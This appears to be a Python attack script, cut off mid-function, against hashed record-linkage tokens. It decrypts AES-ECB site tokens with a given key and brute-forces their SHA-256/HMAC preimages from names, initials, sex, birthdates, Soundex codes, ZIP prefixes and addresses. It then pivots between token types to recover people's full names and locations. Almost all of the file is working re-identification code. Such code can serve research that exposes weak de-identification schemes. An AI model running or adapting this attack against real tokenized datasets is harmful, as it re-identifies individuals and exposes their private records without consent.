#!/usr/bin/env python3
import argparse
import base64
import csv
import hashlib, hmac
from collections import defaultdict
from datetime import datetime, date
from typing import Dict, Any, Iterable, Tuple, Set, Optional
from jellyfish import soundex
from Crypto.Cipher import AES
import pandas as pd
import time

# =============================
# Normalization / helpers
# =============================

# --- Maps for American Soundex (as used by jellyfish.soundex) ---
# This map defines the code for each consonant.
AM_CODE_MAP = {
    b'b': '1', b'p': '1', b'f': '1', b'v': '1',
    b'c': '2', b's': '2', b'g': '2', b'j': '2', b'k': '2', b'q': '2', b'x': '2', b'z': '2',
    b'd': '3', b't': '3',
    b'l': '4',
    b'm': '5', b'n': '5',
    b'r': '6',
}

# This is the inverted map, used for generating preimages from a code.
AM_INV_CODE_MAP = {
    '1': [b'b', b'p', b'f', b'v'],
    '2': [b'c', b's', b'g', b'j', b'k', b'q', b'x', b'z'],
    '3': [b'd', b't'],
    '4': [b'l'],
    '5': [b'm', b'n'],
    '6': [b'r'],
}

# Letters that are "0-coded" (skipped) by American Soundex.
AM_ZERO_CODE_B = [b'a', b'e', b'i', b'o', b'u', b'y', b'h', b'w']
# -----------------------------------------------------------------

# All lowercase alphabet bytes for suffix brute-forcing
ALL_ALPHABET_B = [bytes([c]) for c in range(ord('a'), ord('z')+1)]

HASHES = 0
def digest_and_count(h):
    global HASHES
    HASHES += 1
    return h.digest()

def norm(s: Any) -> str:
    return "".join(ch for ch in str(s or "").strip().lower() if ch.isalnum())

def norm_gender(g: Any) -> str:
    g = str(g or "").strip().lower()
    if g in ("m", "male"): return "m"
    if g in ("f", "female"): return "f"
    return "u"

def norm_dob(s: Any) -> str:
    s = str(s or "").strip()
    fmts = ("%Y-%m-%d", "%d.%m.%Y", "%m/%d/%Y", "%Y/%m/%d", "%Y%m%d")
    for f in fmts:
        try:
            return datetime.strptime(s, f).strftime("%Y%m%d")
        except ValueError:
            pass
    if len(s) == 8 and s.isdigit():
        return s
    return ""

def first_initial(fn: str) -> str:
    n = norm(fn)
    return n[0] if n else ""

def first3(fn: str) -> str:
    n = norm(fn)
    return n[:3] if n else ""

def split_address(address, lang: str):
    """
    Split address into street and number using simple string operations instead of regex.
    For German ('de'): street name first, then number.
    For US ('us'): number first, then street name.
    """
    address = str(address).strip()
    if not address:
        return ""
    parts = address.split()
    if lang == "de":
        for i, part in enumerate(parts):
            if part and part[0].isdigit():
                street = " ".join(parts[:i]).strip()
                number = " ".join(parts[i:]).strip()
                return street.strip().replace("-", "").replace(" ", "")
        return " ".join(parts).strip().replace("-", "").replace(" ", "")
    elif lang == "us":
        if parts and parts[0].isdigit():
            number = parts[0]
            street = " ".join(parts[1:]).strip()
        else:
            street = " ".join(parts).strip()
        return street.strip().replace("-", "").replace(" ", "")
    return address.strip().replace("-", "").replace(" ", "")

def split_address_b(address: str, lang: str) -> Tuple[bytes, bytes]:
    s = (address or "").strip()
    if not s: return b"", b""
    # normalize dash/space, alnum only
    parts = s.replace("-", " ").split()
    chunks = ["".join(ch for ch in p.lower() if ch.isalnum()) for p in parts if p]
    if not chunks: return b"", b""

    if lang == "us":
        # "123 main st" → number first
        if chunks[0] and chunks[0][0].isdigit():
            number = chunks[0].encode()
            street = "".join(chunks[1:]).encode()
            return street, number
    # de or fallback: street then number at first digit-start
    num_idx = None
    for i, p in enumerate(chunks):
        if p and p[0].isdigit():
            num_idx = i; break
    if num_idx is None:
        return "".join(chunks).encode(), b""
    street = "".join(chunks[:num_idx]).encode()
    number = "".join(chunks[num_idx:]).encode()
    return street, number

# =============================
# Improve computation speed
# =============================
TOP_FIRST: list = []
TOP_LAST: list = []
TOP_ADDRESS: list = []
SEX = ["m","f","u"]
SEX_B = [b"m", b"f", b"u"]
SEP = b"|"
INITIALS_B = [bytes([c]) for c in range(ord('a'), ord('z')+1)]

def to_bytes_list(xs):  # normalize+encode once
    return [norm(x).encode("utf-8") for x in xs if str(x).strip()]

def precompute_dobs(min_year, max_year):
    # Returns e.g. [b"19841203", ...] already bytes
    dobs = []
    for y in range(min_year, max_year + 1):
        # simple leap-year check
        leap = (y % 4 == 0) and (y % 100 != 0 or y % 400 == 0)
        mdays = (31, 29 if leap else 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31)
        for m, dmax in enumerate(mdays, 1):
            for d in range(1, dmax + 1):
                dobs.append(f"{y:04d}{m:02d}{d:02d}".encode("utf-8"))
    return dobs

def build_soundex_maps(TOP_FIRST_B, TOP_LAST_B):
    # soundex expects str; decode once here
    FN_BY_INITIAL = defaultdict(list)
    FN_BY_SDX     = defaultdict(list)
    LN_BY_SDX     = defaultdict(list)
    sdx_last_set  = set()
    sdx_first_set = set()
    for ln_b in TOP_LAST_B:
        if not ln_b:
            continue
        sdx_last = soundex(ln_b.decode("utf-8"))
        if sdx_last:
            sdx_last_set.add(sdx_last)
            LN_BY_SDX[sdx_last].append(ln_b)
    for fn_b in TOP_FIRST_B:
        if not fn_b:
            continue
        FN_BY_INITIAL[fn_b[:1]].append(fn_b)
        sdx_fn = soundex(fn_b.decode("utf-8"))
        if sdx_fn:
            sdx_first_set.add(sdx_fn)
            FN_BY_SDX[sdx_fn].append(fn_b)
    SDX_LAST   = sorted(sdx_last_set)
    SDX_FIRST  = sorted(sdx_first_set)
    SDX_LAST_B  = [c.encode("utf-8") for c in SDX_LAST]
    SDX_FIRST_B = [c.encode("utf-8") for c in SDX_FIRST]
    return FN_BY_INITIAL, FN_BY_SDX, LN_BY_SDX, SDX_LAST, SDX_FIRST, SDX_LAST_B, SDX_FIRST_B

def make_init_hasher(master_salt: bytes | None):
    if master_salt is None:
        def init_hasher(prefix=b""):
            h = hashlib.sha256()
            if prefix:
                h.update(prefix)
            return h
    else:
        def init_hasher(prefix=b""):
            return hmac.new(master_salt, prefix, hashlib.sha256)
    return init_hasher

ZIP3_PARTS = [f"{z:03d}".encode("utf-8") for z in range(1000)]

def precompute_house_numbers(lang: str, max_de=500, max_us=1000):
    # returns list of number bytes WITHOUT separators, to be concatenated as needed
    if lang == "de":
        return [f"{n}".encode("utf-8") for n in range(1, max_de+1)]
    elif lang == "us":
        return [f"{n}".encode("utf-8") for n in range(1, max_us+1)]
    else:
        return []
    
def build_first3_map(first_names_b):
    from collections import defaultdict
    m = defaultdict(list)
    for fn in first_names_b:
        if not fn:
            continue
        m[fn[:3]].append(fn)
    return m
    
def precompute_all_soundex_codes() -> Tuple[Set[bytes], Set[bytes]]:
    """Generates all possible 4-character American Soundex codes (LCCC)."""
    initials = [bytes([c]) for c in range(ord('a'), ord('z') + 1)]
    # American Soundex uses digits 1-6
    digits = [bytes([c]) for c in b'123456']
    
    all_sdx_ln = set()
    all_sdx_fn = set()

    for initial in initials:
        sdx_prefix = initial.decode().upper().encode()

        # Generate all 3-digit combinations
        for d1 in digits:
            for d2 in digits:
                for d3 in digits:
                    sdx_code = sdx_prefix + d1 + d2 + d3
                    all_sdx_ln.add(sdx_code)
                    all_sdx_fn.add(sdx_code)
        
        # Also handle 0-padding
        all_sdx_ln.add(sdx_prefix + b'000')
        all_sdx_fn.add(sdx_prefix + b'000')
        for d1 in digits:
             all_sdx_ln.add(sdx_prefix + d1 + b'00')
             all_sdx_fn.add(sdx_prefix + d1 + b'00')
             for d2 in digits:
                 all_sdx_ln.add(sdx_prefix + d1 + d2 + b'0')
                 all_sdx_fn.add(sdx_prefix + d1 + d2 + b'0')

    return all_sdx_ln, all_sdx_fn

def generate_soundex_preimages(soundex_code: str, max_length: int) -> Iterable[bytes]:
    """
    Generates all name strings (up to max_length) that match the
    American Soundex code.
    
    Includes heuristic: max 2 consecutive 0-coded letters.
    Includes suffix: once digits are consumed, switches to full-alphabet
    brute-force for the rest of the name up to max_length.
    """
    if not soundex_code or not soundex_code[0].isalpha() or len(soundex_code) != 4:
        return
        
    initial_char_b = soundex_code[0].lower().encode()
    # Get the code for the first letter (e.g., 'l' -> '4')
    initial_code = AM_CODE_MAP.get(initial_char_b)
    
    # Digits to match, ignoring '0' padding
    digits_to_match = soundex_code[1:].replace('0', '')
    
    # Memoization to avoid re-exploring the same state
    memo = set()

    def _generate(
        current_name_b: bytes,
        last_code_seen: Optional[str],
        remaining_digits: str,
        consecutive_zeros: int,
        in_suffix_mode: bool
    ):
        """
        Recursive helper to generate preimages.
        
        :param current_name_b: The name prefix built so far (e.g., b'maxi')
        :param last_code_seen: The last Soundex code *added* (e.g., '2')
        :param remaining_digits: Digits we still need to match (e.g., '5')
        :param consecutive_zeros: Count of 0-coded letters in a row
        :param in_suffix_mode: If True, switch to full alphabet brute-force
        """
        
        state = (current_name_b, last_code_seen, remaining_digits, consecutive_zeros, in_suffix_mode)
        if state in memo:
            return
        memo.add(state)

        # 1. Base Case: Yield the current name
        # We yield at every step, as a prefix might be a valid name
        yield current_name_b
        
        # 2. Stop condition: Max length reached
        if len(current_name_b) >= max_length:
            return
        
        # --- Suffix Mode ---
        # If we are in suffix mode, just brute-force all letters
        if in_suffix_mode:
            for char_b in ALL_ALPHABET_B:
                if len(current_name_b) + len(char_b) <= max_length:
                    yield from _generate(current_name_b + char_b, None, "", 0, True)
            return
        
        # --- Soundex-Constrained Mode ---

        # 3. Try appending a 0-coded letter (a, e, i, o, u, y, h, w)
        # This *never* consumes a digit and *never* changes last_code_seen
        # Heuristic: limit to 2 in a row
        if consecutive_zeros < 2:
            for char_b in AM_ZERO_CODE_B:
                if len(current_name_b) + len(char_b) <= max_length:
                    yield from _generate(
                        current_name_b + char_b,
                        last_code_seen,
                        remaining_digits,
                        consecutive_zeros + 1,
                        False
                    )
        
        # 4. Try appending a "same-code" consonant
        # e.g., if last_code_seen was '1' (from 'b'), we can add 'p', 'f', 'v'
        # This *does not* consume a digit.
        if last_code_seen:
            for char_b in AM_INV_CODE_MAP.get(last_code_seen, []):
                 if len(current_name_b) + len(char_b) <= max_length:
                    yield from _generate(
                        current_name_b + char_b,
                        last_code_seen,
                        remaining_digits,
                        0, # Resets zero counter
                        False
                    )

        next_digit_to_match = remaining_digits[0] if remaining_digits else None
        
        # 5. Try appending a *new* Coded Consonant
        if next_digit_to_match:
            # Get all letters that map to this digit (e.g., '1' -> [b'b', b'p', b'f', b'v'])
            for char_b in AM_INV_CODE_MAP.get(next_digit_to_match, []):
                # American Soundex rule: only add code if different from previous
                if next_digit_to_match != last_code_seen:
                    if len(current_name_b) + len(char_b) <= max_length:
                        # Consume the digit, update last_code, reset zero counter
                        yield from _generate(
                            current_name_b + char_b,
                            next_digit_to_match,
                            remaining_digits[1:],
                            0,
                            False
                        )
        
        # 6. If no digits are left, transition to suffix mode
        else:
            # All required digits are matched.
            # We can now start the full-alphabet suffix brute-force.
            for char_b in ALL_ALPHABET_B:
                 if len(current_name_b) + len(char_b) <= max_length:
                    # The next state will be in suffix mode
                    yield from _generate(
                        current_name_b + char_b,
                        None, # No more soundex codes
                        "",   # No more digits
                        0,
                        True  # Enter suffix mode
                    )

    # Initial call:
    # Start with the fixed first letter
    # The first "last_code_seen" is the code of the initial letter
    yield from _generate(initial_char_b, initial_code, digits_to_match, 0, False)

# =============================
# Master token functions
# =============================
def master_sha256(token_input: str) -> bytes:
    h = hashlib.sha256()
    h.update(token_input.encode("utf-8"))
    return digest_and_count(h)

def master_hmac(master_salt: bytes, token_input: str) -> bytes:
    h = hmac.new(master_salt, token_input.encode("utf-8"), hashlib.sha256)
    return digest_and_count(h)

def parse_bytes(s: str, *, expect_len: Optional[int] = None) -> bytes:
    """Accept hex or utf-8; optionally enforce expected length."""
    try:
        b = bytes.fromhex(s)
    except ValueError:
        b = s.encode("utf-8")
    if expect_len is not None and len(b) != expect_len:
        raise ValueError(f"Expected {expect_len} bytes, got {len(b)}")
    return b

# =============================
# Site encryption (AES-ECB)
# =============================
def aes256_ecb_decrypt_b64(site_key_32: bytes, token_b64: str) -> bytes:
    """Decrypt base64-encoded site token to raw 32-byte master token."""
    ct = base64.b64decode(token_b64)
    if len(ct) % 16 != 0:
        raise ValueError("Ciphertext is not a multiple of AES block size.")
    cipher = AES.new(site_key_32, AES.MODE_ECB)  # AES-256 (32-byte key)
    pt = cipher.decrypt(ct)
    # Expect SHA-256 output length
    if len(pt) != 32:
        # Some pipelines might pack more; keep it but warn upstream if needed
        pass
    return pt

# =============================
# Token input builders
# =============================
def mk_T1(ln: str, fn: str, g: str, dob: str) -> str:
    fi = first_initial(fn)
    if not (ln and fi and g and dob): return ""
    return f"{ln}|{fi}|{g}|{dob}"

def mk_T2(ln: str, fn: str, g: str, dob: str) -> str:
    sdx_ln = soundex(ln); sdx_fn = soundex(fn)
    if not (sdx_ln and sdx_fn and g and dob): return ""
    return f"{sdx_ln}|{sdx_fn}|{g}|{dob}"

def mk_T4(ln: str, fn: str, g: str, dob: str) -> str:
    if not (ln and fn and g and dob): return ""
    return f"{ln}|{fn}|{g}|{dob}"

def mk_T3(ln: str, fn: str, dob: str, zip3: str) -> str:
    if not (ln and fn and dob and zip3): return ""
    return f"{ln}|{fn}|{dob}|{zip3}"

# =============================
# Load and decrypt site tokens
# =============================
def load_site_tokens(path: str, cols: Iterable[str]) -> Dict[str, list]:
    with open(path, newline="", encoding="utf-8") as f:
        r = csv.DictReader(f)
        rows = list(r)
    return {"_RAW": rows}

def decrypt_columns(rows: list, site_key_32: bytes, colnames: Iterable[str]) -> Dict[str, Set[bytes]]:
    out: Dict[str, Set[bytes]] = {c: set() for c in colnames}
    successes = 0
    failures = 0
    for row in rows:
        for c in colnames:
            val = (row.get(c) or "").strip()
            if not val:
                continue
            try:
                mt = aes256_ecb_decrypt_b64(site_key_32, val)
                out[c].add(mt)
                successes += 1
            except Exception:
                failures += 1
                # keep going
    for c in colnames:
        print(f"[decrypt] {c}: unique master tokens={len(out[c])} (successes={successes}, failures={failures})")
    return out

# =============================
# Attack core
# =============================

# Helper for calculating all birthdays for ages 18 to 80
today = date.today()
min_age = 18
max_age = 80
min_year = today.year - max_age
max_year = today.year - min_age

def attack_T1_fast(master_tokens, lastnames_b, initials_b, dobs_b, init_hasher):
    hits = {}
    for ln in lastnames_b:                  
        h_ln = init_hasher(ln + SEP)              # H(ln|)
        for fi in initials_b:                 
            h_fi = h_ln.copy(); h_fi.update(fi); h_fi.update(SEP)    # H(ln|fi|)
            for g in SEX_B:
                h_sig = h_fi.copy(); h_sig.update(g); h_sig.update(SEP)  # H(ln|fi|g|)
                for dob in dobs_b:              
                    h = h_sig.copy(); h.update(dob)  # H(ln|fi|g|dob)
                    mt = digest_and_count(h)
                    if mt in master_tokens:
                        hits[mt] = (ln, fi, g, dob)
    return hits

def attack_T1_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher):
    """
    Use LN_BY_SDX and FN_BY_SDX to map soundex codes to candidate last/first names,
    then test T1 candidates (ln|fi|g|dob) where fi = first initial of candidate first names.
    """
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_ln_str = sdx_ln_b.decode("utf-8")
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception:
        return hits
    
    # 1. Generate all Last Name candidates from Soundex
    cand_last_names = list(generate_soundex_preimages(sdx_ln_str, max_length=15))

    # Get initial first name from soundex code
    fi_b = sdx_fn_str[:1].lower().encode("utf-8")

    if not cand_last_names:
        return hits
    for ln_b in cand_last_names:
        h_ln = init_hasher(ln_b + SEP)                      # H(ln|)
        h_fi = h_ln.copy(); h_fi.update(fi_b); h_fi.update(SEP)        # H(ln|fi|)
        h_g  = h_fi.copy(); h_g.update(g_b); h_g.update(SEP)          # H(ln|fi|g|)
        h_final = h_g.copy(); h_final.update(dob_b)                 # H(ln|fi|g|dob)
        mt = digest_and_count(h_final)
        if contains(mt):
            hits[mt] = (ln_b, fi_b, g_b, dob_b)
    return hits

def attack_T2_fast(master_tokens, SDX_LAST_B, SDX_FIRST_B, dobs_b, init_hasher):
    hits = {}
    contains = master_tokens.__contains__
    for sdx_ln in SDX_LAST_B:                       # b"X123"
        h_ln = init_hasher(sdx_ln + SEP)            # H(sdx_ln|)
        for sdx_fn in SDX_FIRST_B:
            h_fn = h_ln.copy(); h_fn.update(sdx_fn); h_fn.update(SEP)      # H(sdx_ln|sdx_fn|)
            for g in SEX_B:
                h_sig = h_fn.copy(); h_sig.update(g); h_sig.update(SEP)      # H(...|g|)
                for dob in dobs_b:
                    h = h_sig.copy(); h.update(dob)                   # H(...|dob)
                    mt = digest_and_count(h)
                    if contains(mt):
                        hits[mt] = (sdx_ln, sdx_fn, g, dob)
    return hits

def attack_T2_via_T1(master_tokens, SDX_FIRST, ln_b, fi_b, g_b, dob_b, last_to_sdx, init_hasher):
    """
    Optimized: use cached sdx(last) from last_to_sdx (bytes key -> str soundex) to avoid
    per-iteration decode + soundex computation. Falls back to recomputing if absent.
    """
    hits = {}
    contains = master_tokens.__contains__
    sdx_ln = last_to_sdx.get(ln_b)
    if not sdx_ln:
        try:
            sdx_ln = soundex(ln_b.decode("utf-8"))
        except Exception:
            return hits
    if not sdx_ln:
        return hits
    sdx_ln_b = sdx_ln.encode("utf-8")
    initial_upper = fi_b[:1].decode(errors="ignore").upper()
    if not initial_upper:
        return hits
    cand_sdx_first = [code for code in SDX_FIRST if code and code[0] == initial_upper]
    if not cand_sdx_first:
        return hits
    cand_sdx_first_b = [c.encode("utf-8") for c in cand_sdx_first]
    h_ln = init_hasher(sdx_ln_b + SEP)
    for sdx_fn_b in cand_sdx_first_b:
        h_fn = h_ln.copy(); h_fn.update(sdx_fn_b); h_fn.update(SEP)
        h_g  = h_fn.copy(); h_g.update(g_b); h_g.update(SEP)
        h_final = h_g.copy(); h_final.update(dob_b)
        mt = digest_and_count(h_final)
        if contains(mt):
            hits[mt] = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
    return hits

def attack_T7_via_T1(master_tokens, ln_b, fi_b, g_b, dob_b, init_hasher):
    """
    Recover T7 (ln|fi3|g|dob) from a known T1 preimage (ln|fi|g|dob).

    We know:
      ln_b : last name (bytes)
      fi_b : first initial (single lowercase letter, bytes)
      g_b  : gender byte (b"m"/b"f"/b"u")
      dob_b: b"YYYYMMDD"

    Strategy:
      Enumerate all possible 2nd and 3rd lowercase letters (a-z),
      build fi3 = fi + l2 + l3, hash ln|fi3|g|dob and test membership.
    """
    hits = {}
    contains = master_tokens.__contains__
    if not fi_b or len(fi_b) != 1:
        return hits  # need exactly one-byte initial
    # Prefix hash: H(ln|)
    h_ln = init_hasher(ln_b + SEP)
    letters = range(ord('a'), ord('z') + 1)
    for c2 in letters:
        for c3 in letters:
            fi3_b = fi_b + bytes([c2, c3])
            # H(ln|fi3|)
            h_fi3 = h_ln.copy(); h_fi3.update(fi3_b); h_fi3.update(SEP)
            # H(ln|fi3|g|)
            h_sig = h_fi3.copy(); h_sig.update(g_b); h_sig.update(SEP)
            # H(ln|fi3|g|dob)
            h_final = h_sig.copy(); h_final.update(dob_b)
            mt = digest_and_count(h_final)
            if contains(mt):
                hits[mt] = (ln_b, fi3_b, g_b, dob_b)
    return hits

def attack_T7_via_T2_T1(master_tokens, ln_b, sdx_fn_b, g_b, dob_b, FN_BY_SDX, init_hasher):
    """
    Recover T7 (ln|fi3|g|dob) using T1 (ln|fi|g|dob) + T2's sdx(fn).
    Uses first three actual letters of candidate first names (no padding).
    """
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception:
        return hits
    cand_first_names = FN_BY_SDX.get(sdx_fn_str, [])
    if not cand_first_names:
        return hits
    h_ln = init_hasher(ln_b + SEP)  # H(ln|)
    for fn_b in cand_first_names:
        if len(fn_b) < 1:
            continue
        fi3_b = fn_b[:3]  # no padding
        h_fi3 = h_ln.copy(); h_fi3.update(fi3_b); h_fi3.update(SEP)
        h_sig = h_fi3.copy(); h_sig.update(g_b); h_sig.update(SEP)
        h_final = h_sig.copy(); h_final.update(dob_b)
        mt = digest_and_count(h_final)
        if contains(mt):
            hits[mt] = (ln_b, fi3_b, g_b, dob_b)
    return hits

def attack_T7_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, init_hasher):
    """
    Recover T7 (ln|fi3|g|dob) from T2 (sdx(ln)|sdx(fn)|g|dob) using first three actual letters (no padding).
    Brute-forces all names consistent with the Soundex codes.
    """
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_ln_str = sdx_ln_b.decode("utf-8")
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception:
        return hits
    
    # Brute-force all compatible last/first names from Soundex
    cand_last_names = list(generate_soundex_preimages(sdx_ln_str, max_length=15))
    # Only need first names up to length 3 for fi3
    cand_first_names = list(generate_soundex_preimages(sdx_fn_str, max_length=3))

    if not cand_last_names or not cand_first_names:
        return hits
    for ln_b in cand_last_names:
        h_ln = init_hasher(ln_b + SEP)
        for fi3_b in cand_first_names:
            if not fi3_b:
                continue
            # We only care about fi3, so we only test names of length 1, 2, or 3
            if len(fi3_b) > 3:
                continue # Generator yields prefixes, so 'maxi' might appear
                         # We only want 'm', 'ma', 'max'
            
            h_fi3 = h_ln.copy(); h_fi3.update(fi3_b); h_fi3.update(SEP)
            h_sig = h_fi3.copy(); h_sig.update(g_b); h_sig.update(SEP)
            h_final = h_sig.copy(); h_final.update(dob_b)
            mt = digest_and_count(h_final)
            if contains(mt):
                hits[mt] = (ln_b, fi3_b, g_b, dob_b)
    return hits

def attack_T7_via_T2T1(master_tokens, ln_b, sdx_fn_b, g_b, dob_b, init_hasher):
    """
    Recover T7 (ln|fi3|g|dob) from T2 (sdx(ln)|sdx(fn)|g|dob) and T1 (ln|fi|g|dob) using first three actual letters (no padding).
    Brute-forces all names consistent with the Soundex codes.
    """
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception:
        return hits
        
    # Brute-force all compatible first names from Soundex
    cand_first_names = list(generate_soundex_preimages(sdx_fn_str, max_length=3))

    if not cand_first_names:
        return hits
    
    h_ln = init_hasher(ln_b + SEP)
    for fi3_b in cand_first_names:
        if not fi3_b:
            continue
        if len(fi3_b) > 3:
            continue
            
        h_fi3 = h_ln.copy(); h_fi3.update(fi3_b); h_fi3.update(SEP)
        h_sig = h_fi3.copy(); h_sig.update(g_b); h_sig.update(SEP)
        h_final = h_sig.copy(); h_final.update(dob_b)
        mt = digest_and_count(h_final)
        if contains(mt):
            hits[mt] = (ln_b, fi3_b, g_b, dob_b)
    return hits

def pivot_to_T4_fast(master_tokens, FN_BY_INITIAL, FN_BY_SDX, t1_hit, t2_hit, init_hasher):
    ln, fi, g, dob = t1_hit
    contains = master_tokens.__contains__
    cand_fns = FN_BY_INITIAL.get(fi[:1], [])
    if t2_hit is not None:
        sdx_code = t2_hit[1]
        if isinstance(sdx_code, bytes):
            sdx_code = sdx_code.decode('utf-8', 'ignore')
        pool = FN_BY_SDX.get(sdx_code, [])
        if pool:
            pool_set = set(pool)
            cand_fns = [fn for fn in cand_fns if fn in pool_set]
        else:
            cand_fns = []
    h_ln = init_hasher(ln + SEP)
    hits = {}
    for fn in cand_fns:
        h_fn = h_ln.copy(); h_fn.update(fn); h_fn.update(SEP); h_fn.update(g); h_fn.update(SEP)
        h = h_fn.copy(); h.update(dob)
        mt = digest_and_count(h)
        if contains(mt):
            hits[mt] = (ln, fn, g, dob)
    return hits

def pivot_to_T4_via_T7(master_tokens, ln_b, fi3_b, g_b, dob_b, FIRST3_MAP,init_hasher):
    """
    Recover T4 (ln|fn|g|dob) candidates from a T7 hit (ln|fi3|g|dob) using a
    precomputed prefix -> names map for first 3 letters.
    """
    hits = {}
    contains = master_tokens.__contains__
    # Candidate first names: exact 3-byte prefix match
    # fi3_b = b"max" can map to multiple full names (e.g. b"max", b"maximilian")
    prefix = fi3_b[:3]
    cand_fns = FIRST3_MAP.get(prefix, [])
    if not cand_fns:
        return hits
    h_ln = init_hasher(ln_b + SEP)  # H(ln|)
    for fn_b in cand_fns:
        h_fn = h_ln.copy(); h_fn.update(fn_b); h_fn.update(SEP); h_fn.update(g_b); h_fn.update(SEP)
        h = h_fn.copy(); h.update(dob_b)
        mt = digest_and_count(h)
        if contains(mt):
            hits[mt] = (ln_b, fn_b, g_b, dob_b)  # bytes
    return hits

def pivot_to_T4_via_T7_T2(master_tokens, sdx_ln_b, sdx_fn_b, fi3_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher):
    """
    Recover T4 (ln|fn|g|dob) candidates from a T7 hit (ln|fi3|g|dob) using
    T2's sdx(ln) and sdx(fn) to limit candidate last/first names.
    """
    hits = {}
    contains = master_tokens.__contains__
    try:
        sdx_ln_str = sdx_ln_b.decode("utf-8")
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception:
        return hits
    
    # 1. Generate all Last Name candidates from Soundex
    cand_last_names = list(generate_soundex_preimages(sdx_ln_str, max_length=15))
    # 2. Generate all First Name candidates from Soundex
    cand_first_names = list(generate_soundex_preimages(sdx_fn_str, max_length=10))

    if not cand_last_names or not cand_first_names:
        return hits
    h_gob = init_hasher(SEP); h_gob.update(g_b); h_gob.update(SEP); h_gob.update(dob_b)
    for ln_b in cand_last_names:
        h_ln = init_hasher(ln_b + SEP)
        for fn_b in cand_first_names:
            # Check if fn_b matches fi3_b prefix
            if not fn_b.startswith(fi3_b):
                continue
            h_fn = h_ln.copy(); h_fn.update(fn_b); h_fn.update(SEP)
            h_sig = h_fn.copy(); h_sig.update(g_b); h_sig.update(SEP)
            h_final = h_sig.copy(); h_final.update(dob_b)
            mt = digest_and_count(h_final)
            if contains(mt):
                hits[mt] = (ln_b, fn_b, g_b, dob_b)
    return hits

def pivot_to_T3_fast(master_tokens, ln_b, fn_b, dob_b, init_hasher):
    contains = master_tokens.__contains__
    h0 = init_hasher()
    h0.update(ln_b); h0.update(SEP); h0.update(fn_b); h0.update(SEP); h0.update(dob_b); h0.update(SEP)
    hits = {}
    for zpart in ZIP3_PARTS:
        h = h0.copy(); h.update(zpart)
        mt = digest_and_count(h)
        if contains(mt):
            hits[mt] = (ln_b, fn_b, dob_b, zpart)  # bytes
    return hits

def pivot_to_T9_fast(master_tokens, fn_b, address_list_raw, lang, HOUSE_NUMBERS, init_hasher):
    contains = master_tokens.__contains__
    fn_prefix = init_hasher(fn_b + SEP)
    hits = {}
    for addr_raw in address_list_raw:
        street_b, number_b = split_address_b(addr_raw, lang)
        if not street_b:
            continue
        if lang == "de":
            for num_b in HOUSE_NUMBERS:
                h = fn_prefix.copy(); h.update(street_b + num_b)
                mt = digest_and_count(h)
                if contains(mt):
                    hits[mt] = (fn_b, street_b + num_b)
        elif lang == "us":
            for num_b in HOUSE_NUMBERS:
                h = fn_prefix.copy(); h.update(num_b + street_b)
                mt = digest_and_count(h)
                if contains(mt):
                    hits[mt] = (fn_b, num_b + street_b)
        else:
            h = fn_prefix.copy(); h.update(street_b + number_b)
            mt = digest_and_count(h)
            if contains(mt):
                hits[mt] = (fn_b, street_b + number_b)
    return hits

# =============================
# Full brute force functions (used with context of T2 all BF hits)
# =============================

def attack_T1_via_T2_pure(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher):
    """
    Finds T1 preimages from a T2 hit and returns them *with* the T2 context.
    """
    hits_with_context = {}
    # Get the T1 hits (ln, fi, g, dob)
    t1_hits = attack_T1_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, LN_BY_SDX, FN_BY_SDX, init_hasher)
    
    t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
    for mt, t1_preimage in t1_hits.items():
        # Store as: { mt: ((t1_preimage), (t2_preimage)) }
        hits_with_context[mt] = (t1_preimage, t2_preimage)
        
    return hits_with_context

def attack_T7_via_T1_pure(master_tokens, t1_preimage, t2_preimage, init_hasher):
    """
    Finds T7 preimages from a T1 hit and returns them *with* the T2 context.
    t1_preimage = (ln_b, fi_b, g_b, dob_b)
    t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
    """
    hits_with_context = {}
    (ln_b, fi_b, g_b, dob_b) = t1_preimage
    
    # Get the T7 hits (ln, fi3, g, dob)
    t7_hits = attack_T7_via_T1(master_tokens, ln_b, fi_b, g_b, dob_b, init_hasher)
    
    for mt, t7_preimage in t7_hits.items():
        # Store as: { mt: ((t7_preimage), (t2_preimage)) }
        hits_with_context[mt] = (t7_preimage, t2_preimage)
        
    return hits_with_context

def attack_T7_via_T2_pure(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, init_hasher):
    """
    Finds T7 preimages from a T2 hit and returns them *with* the T2 context.
    """
    hits_with_context = {}
    
    # Get the T7 hits (ln, fi3, g, dob)
    t7_hits = attack_T7_via_T2(master_tokens, sdx_ln_b, sdx_fn_b, g_b, dob_b, init_hasher)
    
    t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
    for mt, t7_preimage in t7_hits.items():
        # Store as: { mt: ((t7_preimage), (t2_preimage)) }
        hits_with_context[mt] = (t7_preimage, t2_preimage)
        
    return hits_with_context

def pivot_to_T4_via_T1_T2_pure(master_tokens, t1_preimage, t2_preimage, init_hasher):
    """
    (PURE BRUTE-FORCE)
    Pivots from a T1 hit to T4, using the T2 context (sdx_fn)
    to generate all possible first names.
    
    t1_preimage = (ln_b, fi_b, g_b, dob_b)
    t2_preimage = (sdx_ln_b, sdx_fn_b, g_b, dob_b)
    """
    hits = {}
    contains = master_tokens.__contains__
    
    (ln_b, fi_b, g_b, dob_b) = t1_preimage
    (sdx_ln_b, sdx_fn_b, _, _) = t2_preimage
    
    try:
        sdx_fn_str = sdx_fn_b.decode("utf-8")
    except Exception:
        return hits
        
    # Pre-hash the known parts: H(ln|)
